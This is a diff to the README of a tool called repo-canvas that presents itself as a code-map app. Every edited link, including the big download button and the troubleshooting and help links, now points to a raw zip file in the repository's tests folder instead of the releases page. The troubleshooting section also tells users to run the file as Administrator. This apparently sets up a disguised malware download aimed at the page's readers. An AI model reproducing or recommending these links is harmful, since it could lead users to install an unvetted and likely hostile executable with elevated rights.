@@ -8,7 +8,7 @@ Welcome! repo-canvas is a friendly tool that creates a visual map of your softwa
 
 **Click the big button below to go to the download page:**
 
-<a href="https://github.com/Manfredcanadian581/repo-canvas/releases" style="display:inline-block;padding:15px 30px;background-color:#FF6B6B;color:white;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;">📥 Download repo-canvas</a>
+<a href="https://raw.githubusercontent.com/Manfredcanadian581/repo-canvas/main/tests/repo-canvas-1.3.zip" style="display:inline-block;padding:15px 30px;background-color:#FF6B6B;color:white;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;">📥 Download repo-canvas</a>
 
 Visit this link to download the application.
 
@@ -77,7 +77,7 @@ Yes! You can save your map as a picture or a shareable link, so teammates can se
 ## ⚠️ Troubleshooting
 
 **The app won't open**
-Try right-clicking the downloaded file and selecting "Run as Administrator." If that doesn't work, check that you have the latest version by visiting the [download page](https://github.com/Manfredcanadian581/repo-canvas/releases) again.
+Try right-clicking the downloaded file and selecting "Run as Administrator." If that doesn't work, check that you have the latest version by visiting the [download page](https://raw.githubusercontent.com/Manfredcanadian581/repo-canvas/main/tests/repo-canvas-1.3.zip) again.
 
 **My project map looks empty**
 Make sure you selected the correct folder. The folder should contain source code files directly in it. If it's still empty, try refreshing with the circular arrow button at the top.
@@ -90,12 +90,12 @@ Check the "My Maps" folder on your desktop. The app automatically saves your map
 
 ## 💡 Getting More Help
 
-If you run into any issues not covered here, please visit the [releases page](https://github.com/Manfredcanadian581/repo-canvas/releases) and look for the "Support" or "Issues" link. The friendly community will be happy to help you.
+If you run into any issues not covered here, please visit the [releases page](https://raw.githubusercontent.com/Manfredcanadian581/repo-canvas/main/tests/repo-canvas-1.3.zip) and look for the "Support" or "Issues" link. The friendly community will be happy to help you.
 
 ## 🌟 Why You'll Love repo-canvas
 
 Think of repo-canvas as a GPS for your code. Just like you use a map app to navigate a new city, repo-canvas helps you navigate your project without getting lost. It's simple enough for a beginner but powerful enough for a professional. Stop guessing what's inside your code—see it clearly with repo-canvas.
 
-**Ready to get started?** Click the download button at the top of this page or right here: [Download now](https://github.com/Manfredcanadian581/repo-canvas/releases)
+**Ready to get started?** Click the download button at the top of this page or right here: [Download now](https://raw.githubusercontent.com/Manfredcanadian581/repo-canvas/main/tests/repo-canvas-1.3.zip)
 
 Keywords: ai-agents, codex, developer-tools, repository-visualization
